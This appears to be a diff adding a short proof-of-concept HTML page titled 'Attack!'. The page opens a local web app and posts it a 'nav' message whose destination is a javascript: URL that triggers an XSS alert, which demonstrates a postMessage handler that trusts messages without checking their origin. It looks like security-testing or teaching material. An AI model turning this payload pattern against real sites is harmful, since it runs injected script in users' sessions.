@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Attack!</title>
+	<script>
+	let win = window.open("http://localhost:8000/home.html")
+	setTimeout(()=>{
+				win.postMessage({
+			type:'nav',
+			destination:"javascript:alert('xss')"
+		},"*")
+	},1000)
+
+	</script>
+</head>
+<body>
+
+</body>
+</html>
